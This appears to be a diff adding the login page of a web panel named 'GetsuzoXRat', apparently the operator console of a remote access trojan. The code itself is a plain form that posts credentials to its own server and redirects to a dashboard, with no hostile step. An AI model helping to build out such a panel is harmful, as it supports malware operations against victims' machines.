@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GetsuzoXRat - Login</title>
+    <style>
+        body { margin: 0; background: #0d0f12; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #00ff66; text-align: center; width: 280px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #0d1117; border: 1px solid #30363d; color: #fff; box-sizing: border-box; border-radius: 6px; }
+        button { width: 100%; padding: 10px; background: #00ff66; border: none; font-weight: bold; cursor: pointer; border-radius: 6px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>GetsuzoXRat</h2>
+        <input type="text" id="user" placeholder="Username">
+        <input type="password" id="pass" placeholder="Password">
+        <button onclick="login()">LOGIN</button>
+    </div>
+    <script>
+        async function login() {
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ username: document.getElementById('user').value, password: document.getElementById('pass').value })
+            });
+            const data = await res.json();
+            if(data.success) {
+                localStorage.setItem('user', JSON.stringify(data));
+                window.location.href = '/dashboard';
+            } else { alert(data.message); }
+        }
+    </script>
+</body>
+</html>
